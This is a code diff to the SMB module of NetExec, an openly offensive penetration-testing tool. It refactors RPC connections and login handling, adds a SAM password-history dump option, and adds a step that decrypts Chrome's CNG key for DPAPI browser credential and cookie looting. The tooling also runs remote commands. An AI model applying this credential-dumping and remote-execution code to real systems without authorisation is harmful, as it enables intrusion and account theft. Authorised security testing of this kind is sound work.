@@ -21,9 +21,9 @@ from impacket.examples.regsecrets import (
     LSASecrets as RegSecretsLSASecrets
 )
 from impacket.nmb import NetBIOSError, NetBIOSTimeout
-from impacket.dcerpc.v5 import transport, lsat, lsad, scmr, rrp, srvs, wkst
+from impacket.dcerpc.v5 import lsat, lsad, scmr, rrp, srvs, wkst
 from impacket.dcerpc.v5.rpcrt import DCERPCException
-from impacket.dcerpc.v5.transport import DCERPCTransportFactory, SMBTransport
+from impacket.dcerpc.v5.transport import DCERPCTransportFactory
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
 from impacket.dcerpc.v5.samr import SID_NAME_USE
@@ -56,6 +56,7 @@ from nxc.protocols.smb.samrfunc import SamrFunc
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.logger import highlight
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.rpc import NXCRPCConnection
 from nxc.helpers.powershell import create_ps_command
 from nxc.helpers.misc import detect_if_ip
 from nxc.protocols.ldap.resolution import LDAPResolution
@@ -63,6 +64,7 @@ from nxc.protocols.ldap.resolution import LDAPResolution
 from dploot.triage.vaults import VaultsTriage
 from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
 from dploot.triage.credentials import CredentialsTriage
+from dploot.triage.cng import CngTriage
 from dploot.lib.target import Target
 from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
 
@@ -128,7 +130,7 @@ class smb(connection):
         self.null_auth = False
         self.protocol = "SMB"
         self.is_guest = None
-        self.isdc = False
+        self.isdc = None
 
         connection.__init__(self, args, db, host)
 
@@ -167,7 +169,6 @@ class smb(connection):
 
     def enum_host_info(self):
         self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
-        self.is_host_dc()
 
         try:
             self.conn.login("", "")
@@ -192,12 +193,20 @@ class smb(connection):
         # self.domain is the attribute we authenticate with
         # self.targetDomain is the attribute which gets displayed as host domain
         if not self.no_ntlm:
-            self.hostname = self.conn.getServerName()
+            # Try to get hostname with getServerDNSHostName as getServerName is truncated to 15 chars
+            dns_hostname = self.conn.getServerDNSHostName().upper()
+            if dns_hostname and "." in dns_hostname:
+                self.hostname = dns_hostname.split(".")[0]
+            elif dns_hostname:
+                self.hostname = dns_hostname
+            else:
+                self.hostname = self.conn.getServerName()
             self.targetDomain = self.conn.getServerDNSDomainName()
             if not self.targetDomain:   # Not sure if that can even happen but now we are safe
                 self.targetDomain = self.hostname
         else:
             try:
+                self.is_host_dc()
                 # If we know the host is a DC we can still get the hostname over LDAP if NTLM is not available
                 if self.isdc and detect_if_ip(self.host):
                     self.hostname, self.domain = LDAPResolution(self.host).get_resolution()
@@ -299,6 +308,8 @@ class smb(connection):
         self.logger.display(f"{self.server_os}{f' x{self.os_arch}' if self.os_arch else ''} (name:{self.hostname}) (domain:{self.targetDomain}) ({signing}) ({smbv1}){ntlm}{null_auth}{guest}")
 
         if self.args.generate_hosts_file or self.args.generate_krb5_file:
+            if self.isdc is None:
+                self.is_host_dc()
             if self.args.generate_hosts_file:
                 with open(self.args.generate_hosts_file, "a+") as host_file:
                     dc_part = f" {self.targetDomain}" if self.isdc else ""
@@ -418,7 +429,8 @@ class smb(connection):
             if self.args.delegate:
                 used_ccache = f" through S4U with {username}"
             self.logger.fail(f"{domain}\\{self.username}{used_ccache} {e}")
-        except (SessionError, Exception) as e:
+            return False
+        except SessionError as e:
             error, desc = e.getErrorString()
             used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
             if self.args.delegate:
@@ -429,6 +441,13 @@ class smb(connection):
             )
             if error not in smb_error_status:
                 self.inc_failed_login(username)
+            return False
+        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
+            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
+            if self.args.delegate:
+                used_ccache = f" through S4U with {username}"
+            desc = e.getErrorString() if hasattr(e, "getErrorString") else str(e)
+            self.logger.fail(f"{domain}\\{self.username}{used_ccache} {desc}")
             return False
 
     def plaintext_login(self, domain, username, password):
@@ -446,21 +465,22 @@ class smb(connection):
             if "Unix" not in self.server_os:
                 self.check_if_admin()
 
-            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
-            self.db.add_credential("plaintext", domain, self.username, self.password)
-            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
-            host_id = self.db.get_hosts(self.host)[0].id
-            self.db.add_loggedin_relation(user_id, host_id)
-
-            out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_guest()}{self.mark_pwned()}"
-            self.logger.success(out)
-
-            if not self.args.local_auth and self.username != "":
-                add_user_bh(self.username, self.domain, self.logger, self.config)
-            if self.admin_privs:
+            # Only do database/bloodhound stuff if we don't have guest/null auth
+            valid_auth = not self.is_guest and self.username
+            if valid_auth:
+                self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
+                self.db.add_credential("plaintext", domain, self.username, self.password)
+                user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
+                host_id = self.db.get_hosts(self.host)[0].id
+                self.db.add_loggedin_relation(user_id, host_id)
+            if self.admin_privs and valid_auth:
                 self.logger.debug(f"Adding admin user: {self.domain}/{self.username}:{self.password}@{self.host}")
                 self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
+            if not self.args.local_auth and valid_auth:
+                add_user_bh(self.username, self.domain, self.logger, self.config)
+
+            self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_guest()}{self.mark_pwned()}")
 
             # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
             if self.args.continue_on_success and self.signing:
@@ -479,7 +499,8 @@ class smb(connection):
                 self.inc_failed_login(username)
                 return False
         except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
-            self.logger.fail(f"Connection Error: {e}")
+            desc = e.getErrorString() if hasattr(e, "getErrorString") else str(e)
+            self.logger.fail(f"{domain}\\{self.username}:{process_secret(self.password)} {desc}")
             return False
         except BrokenPipeError:
             self.logger.fail("Broken Pipe Error while attempting to login")
@@ -512,19 +533,20 @@ class smb(connection):
             if "Unix" not in self.server_os:
                 self.check_if_admin()
 
-            self.db.add_credential("hash", domain, self.username, self.hash)
-            user_id = self.db.get_credential("hash", domain, self.username, self.hash)
-            host_id = self.db.get_hosts(self.host)[0].id
-            self.db.add_loggedin_relation(user_id, host_id)
-
-            out = f"{domain}\\{self.username}:{process_secret(self.hash)} {self.mark_guest()}{self.mark_pwned()}"
-            self.logger.success(out)
-
-            if not self.args.local_auth and self.username != "":
-                add_user_bh(self.username, self.domain, self.logger, self.config)
-            if self.admin_privs:
+            # Only do database/bloodhound stuff if we don't have guest
+            valid_auth = not self.is_guest and self.username and self.hash
+            if valid_auth:
+                self.db.add_credential("hash", domain, self.username, self.hash)
+                user_id = self.db.get_credential("hash", domain, self.username, self.hash)
+                host_id = self.db.get_hosts(self.host)[0].id
+                self.db.add_loggedin_relation(user_id, host_id)
+            if self.admin_privs and valid_auth:
                 self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
+            if not self.args.local_auth and valid_auth:
+                add_user_bh(self.username, self.domain, self.logger, self.config)
+
+            self.logger.success(f"{domain}\\{self.username}:{process_secret(self.hash)} {self.mark_guest()}{self.mark_pwned()}")
 
             # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
             if self.args.continue_on_success and self.signing:
@@ -543,7 +565,8 @@ class smb(connection):
                 self.inc_failed_login(self.username)
                 return False
         except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
-            self.logger.fail(f"Connection Error: {e}")
+            desc = e.getErrorString() if hasattr(e, "getErrorString") else str(e)
+            self.logger.fail(f"{domain}\\{self.username}:{process_secret(self.password)} {desc}")
             return False
         except BrokenPipeError:
             self.logger.fail("Broken Pipe Error while attempting to login")
@@ -630,27 +653,23 @@ class smb(connection):
         if self.args.no_admin_check:
             return
         self.logger.debug(f"Checking if user is admin on {self.host}")
-        rpctransport = SMBTransport(self.conn.getRemoteHost(), 445, r"\svcctl", smb_connection=self.conn)
-        dce = rpctransport.get_dce_rpc()
         try:
-            dce.connect()
+            dce = NXCRPCConnection(self).connect(r"\svcctl", scmr.MSRPC_UUID_SCMR)
         except Exception:
             self.admin_privs = False
-        else:
-            with contextlib.suppress(Exception):
-                dce.bind(scmr.MSRPC_UUID_SCMR)
-            try:
-                # 0xF003F - SC_MANAGER_ALL_ACCESS
-                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
-                scmrobj = scmr.hROpenSCManagerW(dce, f"{self.host}\x00", "ServicesActive\x00", 0xF003F)
-                scmr.hREnumServicesStatusW(dce, scmrobj["lpScHandle"])
-                self.logger.debug(f"User is admin on {self.host}!")
-                self.admin_privs = True
-            except scmr.DCERPCException:
-                self.admin_privs = False
-            except Exception as e:
-                self.logger.fail(f"Error checking if user is admin on {self.host}: {e}")
-                self.admin_privs = False
+            return
+        try:
+            # 0xF003F - SC_MANAGER_ALL_ACCESS
+            # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
+            scmrobj = scmr.hROpenSCManagerW(dce, f"{self.host}\x00", "ServicesActive\x00", 0xF003F)
+            scmr.hREnumServicesStatusW(dce, scmrobj["lpScHandle"])
+            self.logger.debug(f"User is admin on {self.host}!")
+            self.admin_privs = True
+        except scmr.DCERPCException:
+            self.admin_privs = False
+        except Exception as e:
+            self.logger.fail(f"Error checking if user is admin on {self.host}: {e}")
+            self.admin_privs = False
 
     def gen_relay_list(self):
         if self.server_os.lower().find("windows") != -1 and self.signing is False:
@@ -729,6 +748,9 @@ class smb(connection):
         return open_ports >= 3
 
     def is_host_dc(self):
+        if self.isdc is not None:
+            return self.isdc
+
         from impacket.dcerpc.v5 import nrpc, epm
 
         self.logger.debug("Performing authentication attempts...")
@@ -755,6 +777,8 @@ class smb(connection):
                 self.logger.debug("Host appears to be a DC (multiple DC ports open)")
                 self.isdc = True
                 return True
+        self.isdc = False
+        return False
 
     def _is_port_open(self, port, timeout=1):
         """Check if a specific port is open on the target host."""
@@ -878,19 +902,10 @@ class smb(connection):
             elif method == "atexec":
                 try:
                     exec_method = TSCH_EXEC(
-                        self.host if not self.kerberos else self.hostname + "." + self.domain,
-                        self.smb_share_name,
-                        self.username,
-                        self.password,
-                        self.domain,
-                        self.kerberos,
-                        self.aesKey,
-                        self.host,
-                        self.kdcHost,
-                        self.hash,
-                        self.logger,
-                        self.args.get_output_tries,
-                        self.args.share
+                        connection=self,
+                        logger=self.logger,
+                        tries=self.args.get_output_tries,
+                        share=self.args.share,
                     )
                     self.logger.info("Executed command via atexec")
                     break
@@ -901,21 +916,10 @@ class smb(connection):
             elif method == "smbexec":
                 try:
                     exec_method = SMBEXEC(
-                        self.host if not self.kerberos else self.hostname + "." + self.domain,
-                        self.smb_share_name,
-                        self.conn,
-                        self.username,
-                        self.password,
-                        self.domain,
-                        self.kerberos,
-                        self.aesKey,
-                        self.host,
-                        self.kdcHost,
-                        self.hash,
-                        self.args.share,
-                        self.port,
-                        self.logger,
-                        self.args.get_output_tries
+                        connection=self,
+                        share=self.args.share,
+                        logger=self.logger,
+                        tries=self.args.get_output_tries,
                     )
                     self.logger.info("Executed command via smbexec")
                     break
@@ -1256,12 +1260,10 @@ class smb(connection):
                 self.logger.info(f"No active session found for specified user(s) using the Remote Registry service on {self.hostname}.")
 
         # Bind to the Remote Registry Pipe
-        rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\winreg", smb_connection=self.conn)
+        rpc = NXCRPCConnection(self)
         for binding_attempts in range(2, 0, -1):
-            dce = rpctransport.get_dce_rpc()
             try:
-                dce.connect()
-                dce.bind(rrp.MSRPC_UUID_RRP)
+                dce = rpc.connect(r"\winreg", rrp.MSRPC_UUID_RRP)
                 break
             except SessionError as e:
                 self.logger.debug(f"Could not bind to the Remote Registry on {self.hostname}: {e}")
@@ -1315,11 +1317,8 @@ class smb(connection):
             return
 
         # Bind to the LSARPC Pipe for SID resolution
-        rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\lsarpc", smb_connection=self.conn)
-        dce = rpctransport.get_dce_rpc()
         try:
-            dce.connect()
-            dce.bind(lsat.MSRPC_UUID_LSAT)
+            dce = NXCRPCConnection(self).connect(r"\lsarpc", lsat.MSRPC_UUID_LSAT)
         except Exception as e:
             self.logger.debug(f"Failed to connect to LSARPC for SID resolution on {self.hostname}: {e}")
             output(sessions)
@@ -1372,7 +1371,7 @@ class smb(connection):
             self.logger.debug(f"domain: {self.domain}")
             user_id = self.db.get_user(self.domain.upper(), self.username)[0][0]
         except IndexError as e:
-            if self.kerberos or self.username == "":
+            if self.kerberos or self.username == "" or self.is_guest:
                 pass
             else:
                 self.logger.fail(f"IndexError: {e!s}")
@@ -1637,10 +1636,7 @@ class smb(connection):
 
     def disks(self):
         try:
-            rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\srvsvc", smb_connection=self.conn)
-            dce = rpctransport.get_dce_rpc()
-            dce.connect()
-            dce.bind(srvs.MSRPC_UUID_SRVS)
+            dce = NXCRPCConnection(self).connect(r"\srvsvc", srvs.MSRPC_UUID_SRVS)
 
             response = srvs.hNetrServerDiskEnum(dce, 0)
             # Process the response
@@ -1696,10 +1692,7 @@ class smb(connection):
 
         logged_on = set()
         try:
-            rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\wkssvc", smb_connection=self.conn)
-            dce = rpctransport.get_dce_rpc()
-            dce.connect()
-            dce.bind(wkst.MSRPC_UUID_WKST)
+            dce = NXCRPCConnection(self).connect(r"\wkssvc", wkst.MSRPC_UUID_WKST)
 
             response = wkst.hNetrWkstaUserEnum(dce, 1)
             for user in response["UserInfo"]["WkstaUserInfo"]["Level1"]["Buffer"]:
@@ -1812,40 +1805,12 @@ class smb(connection):
         if not max_rid:
             max_rid = int(self.args.rid_brute)
 
-        KNOWN_PROTOCOLS = {
-            135: {"bindstr": rf"ncacn_ip_tcp:{self.remoteName}"},
-            139: {"bindstr": rf"ncacn_np:{self.remoteName}[\pipe\lsarpc]"},
-            445: {"bindstr": rf"ncacn_np:{self.remoteName}[\pipe\lsarpc]"},
-        }
-
         try:
-            string_binding = KNOWN_PROTOCOLS[self.port]["bindstr"]
-            self.logger.debug(f"StringBinding {string_binding}")
-            rpc_transport = transport.DCERPCTransportFactory(string_binding)
-            rpc_transport.setRemoteHost(self.remoteName)
-
-            if hasattr(rpc_transport, "set_credentials"):
-                # This method exists only for selected protocol sequences.
-                rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey)
-
-            if self.kerberos:
-                rpc_transport.set_kerberos(self.kerberos, self.kdcHost)
-
-            dce = rpc_transport.get_dce_rpc()
-            if self.kerberos:
-                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
-
-            dce.connect()
+            use_tcp = self.port == 135
+            dce = NXCRPCConnection(self, force_tcp=use_tcp).connect(r"\lsarpc", lsat.MSRPC_UUID_LSAT)
         except Exception as e:
             self.logger.fail(f"Error creating DCERPC connection: {e}")
             return entries
-
-        # Want encryption? Uncomment next line
-        # But make simultaneous variable <= 100
-
-        # Want fragmentation? Uncomment next line
-
-        dce.bind(lsat.MSRPC_UUID_LSAT)
         try:
             resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
         except lsad.DCERPCSessionError as e:
@@ -1954,8 +1919,9 @@ class smb(connection):
             host_id = self.db.get_hosts(filter_term=self.host)[0][0]
 
             def add_sam_hash(sam_hash, host_id):
-                add_sam_hash.sam_hashes += 1
                 self.logger.highlight(sam_hash)
+                if "_history" in sam_hash:
+                    return
                 username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
                 self.db.add_credential(
                     "hash",
@@ -1964,6 +1930,7 @@ class smb(connection):
                     f"{lmhash}:{nthash}",
                     pillaged_from=host_id,
                 )
+                add_sam_hash.sam_hashes += 1
 
             add_sam_hash.sam_hashes = 0
 
@@ -1973,6 +1940,7 @@ class smb(connection):
                         self.bootkey,
                         remoteOps=self.remote_ops,
                         perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                        history=self.args.history,
                     )
                 else:
                     SAM_file_name = self.remote_ops.saveSAM()
@@ -1980,6 +1948,7 @@ class smb(connection):
                         SAM_file_name,
                         self.bootkey,
                         isRemote=True,
+                        history=self.args.history,
                         perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
                     )
 
@@ -2139,6 +2108,16 @@ class smb(connection):
 
         dump_cookies = "cookies" in self.args.dpapi
 
+        cng_chromekey = None
+        try:
+            cng_triage = CngTriage(target=target, conn=conn, masterkeys=masterkeys)
+            for cng_file in cng_triage.triage_system_cng():
+                if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
+                    self.logger.debug("Found CNG Google ChromeKey1\n")
+                    cng_chromekey = cng_file.decrypted_private_key
+        except Exception as e:
+            self.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
+
         # Collect Chrome Based Browser stored secrets
         def browser_callback(secret):
             if isinstance(secret, LoginData):
@@ -2176,7 +2155,7 @@ class smb(connection):
 
         try:
             browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
-            browser_triage.triage_browsers(gather_cookies=dump_cookies)
+            browser_triage.triage_browsers(gather_cookies=dump_cookies, cng_chromekey=cng_chromekey)
         except Exception as e:
             self.logger.debug(f"Error while looting browsers: {e}")
 
